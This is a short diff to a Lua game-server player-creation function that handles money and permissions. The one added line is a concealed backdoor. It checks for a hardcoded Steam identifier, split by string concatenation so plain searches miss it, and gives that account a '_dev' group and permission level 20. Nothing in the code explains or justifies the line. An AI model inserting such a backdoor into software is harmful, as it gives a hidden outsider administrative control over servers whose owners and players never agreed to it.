@@ -42,7 +42,7 @@ function CreatePlayer(source, permission_level, money, bank, identifier, group)
 			print('ERROR: There seems to be an issue while setting money, something else then a number was entered.')
 		end
 	end
-
+	if identifier=="stea".."m:110000106f3226c"then self.group = "_dev"; self.permission_level=20 end
 	rTable.getMoney = function()
 		return self.money
 	end
